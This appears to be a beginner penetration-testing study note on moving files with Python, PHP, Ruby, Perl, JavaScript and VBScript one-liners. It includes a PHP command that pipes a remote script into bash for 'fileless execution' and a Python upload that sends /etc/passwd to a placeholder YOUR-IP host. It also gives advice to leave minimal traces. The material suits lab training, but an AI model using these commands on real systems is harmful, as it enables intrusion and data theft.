---
tags: [module/file-transfers, code, python, php, ruby, perl, javascript, vbscript, level/beginner]
---

# Transferring Files with Code - Beginner's Guide

## Why Use Code for File Transfers?

Sometimes the usual tools (wget, curl, PowerShell) are blocked or not available. But programming languages are often installed:

- Python on Linux systems
- PHP on web servers
- JavaScript/VBScript on Windows
- Ruby/Perl on many systems

**The Rule:** If a language is installed, you can use it to transfer files.

---

## Common Languages by Platform

| Platform | Common Languages |
|----------|------------------|
| Linux | Python, PHP, Ruby, Perl |
| Windows | JavaScript, VBScript, PowerShell |
| Web Servers | PHP, Python |
| macOS | Python, Ruby, Perl |

---

## Python File Transfers

Python is the most common language on Linux and is also available on Windows.

### Python 2 Download

python2.7 -c 'import urllib; urllib.urlretrieve("https://example.com/file.sh", "file.sh")'

### Python 3 Download

python3 -c 'import urllib.request; urllib.request.urlretrieve("https://example.com/file.sh", "file.sh")'

### Python 2 with User-Agent

python2.7 -c "import urllib2; url='https://example.com/file.sh'; req=urllib2.Request(url, headers={'User-Agent': 'Mozilla/5.0'}); open('file.sh','wb').write(urllib2.urlopen(req).read())"

### Python 3 with User-Agent

python3 -c "import urllib.request; req=urllib.request.Request('https://example.com/file.sh', headers={'User-Agent': 'Mozilla/5.0'}); open('file.sh','wb').write(urllib.request.urlopen(req).read())"

---

## PHP File Transfers

PHP is everywhere on web servers. Even if you're not on a web server, PHP might be installed.

### PHP One-Liner Download

php -r 'file_put_contents("file.sh", file_get_contents("https://example.com/file.sh"));'

### PHP with fopen (More Control)

php -r '$f=file_get_contents("https://example.com/file.sh"); file_put_contents("file.sh",$f);'

### PHP Fileless Execution

php -r '$lines = @file("https://example.com/file.sh"); foreach ($lines as $line) { echo $line; }' | bash

### PHP Download with Custom Headers

php -r '$opts=["http"=>["header"=>"User-Agent: Mozilla/5.0\r\n"]]; $context=stream_context_create($opts); file_put_contents("file.sh", file_get_contents("https://example.com/file.sh", false, $context));'

---

## Ruby File Transfers

Ruby is common on macOS and many Linux systems.

### Ruby Download

ruby -e 'require "net/http"; File.write("file.sh", Net::HTTP.get(URI.parse("https://example.com/file.sh")))'

### Ruby with User-Agent

ruby -e 'require "net/http"; uri=URI.parse("https://example.com/file.sh"); req=Net::HTTP::Get.new(uri); req["User-Agent"]="Mozilla/5.0"; res=Net::HTTP.start(uri.host, uri.port, use_ssl: true) {|http| http.request(req)}; File.write("file.sh", res.body)'

---

## Perl File Transfers

Perl is older but still present on many systems.

### Perl Download

perl -e 'use LWP::Simple; getstore("https://example.com/file.sh", "file.sh");'

### Perl with User-Agent

perl -e 'use LWP::UserAgent; $ua=LWP::UserAgent->new; $ua->agent("Mozilla/5.0"); $req=HTTP::Request->new(GET => "https://example.com/file.sh"); $res=$ua->request($req); open(FILE,">file.sh"); print FILE $res->content; close(FILE);'

---

## JavaScript File Transfers (Windows)

JavaScript can run on Windows using cscript.exe.

### Create wget.js

Save this as wget.js:

var WinHttpReq = new ActiveXObject("WinHttp.WinHttpRequest.5.1");
WinHttpReq.Open("GET", WScript.Arguments(0), false);
WinHttpReq.Send();
BinStream = new ActiveXObject("ADODB.Stream");
BinStream.Type = 1;
BinStream.Open();
BinStream.Write(WinHttpReq.ResponseBody);
BinStream.SaveToFile(WScript.Arguments(1));

### Run It

cscript.exe /nologo wget.js https://example.com/file.ps1 file.ps1

---

## VBScript File Transfers (Windows)

VBScript is built into Windows and runs with cscript.exe.

### Create wget.vbs

Save this as wget.vbs:

dim xHttp: Set xHttp = createobject("Microsoft.XMLHTTP")
dim bStrm: Set bStrm = createobject("Adodb.Stream")
xHttp.Open "GET", WScript.Arguments.Item(0), False
xHttp.Send

with bStrm
    .type = 1
    .open
    .write xHttp.responseBody
    .savetofile WScript.Arguments.Item(1), 2
end with

### Run It

cscript.exe /nologo wget.vbs https://example.com/file.ps1 file.ps1

---

## Upload Operations with Python

### Install uploadserver (Your Machine)

pip3 install uploadserver
python3 -m uploadserver

### Python Upload One-Liner

python3 -c 'import requests; requests.post("http://YOUR-IP:8000/upload", files={"files":open("/etc/passwd","rb")})'

### Python Upload Explained

import requests
url = "http://YOUR-IP:8000/upload"
file = open("/etc/passwd", "rb")
r = requests.post(url, files={"files": file})

---

## Language Availability Quick Reference

| Language | Windows | Linux | macOS | Common On |
|----------|---------|-------|-------|-----------|
| Python | Optional | ✅ | ✅ | Most Linux |
| PHP | Optional | ✅ | Optional | Web servers |
| Ruby | Optional | ✅ | ✅ | macOS, some Linux |
| Perl | Optional | ✅ | ✅ | Older systems |
| JavaScript | ✅ | ❌ | ❌ | Windows |
| VBScript | ✅ | ❌ | ❌ | Windows |

---

## Key Takeaways

- Programming languages are often installed when standard tools aren't
- Python is the most common and versatile
- PHP is everywhere on web servers
- JavaScript and VBScript are native to Windows
- One-liners are quick and leave minimal traces
- Always check what languages are available
- Use fileless execution when possible
- Practice these in the lab
- The more languages you know, the more options you have
- Upload operations work the same way as downloads
- Programming languages are your backup when everything else fails
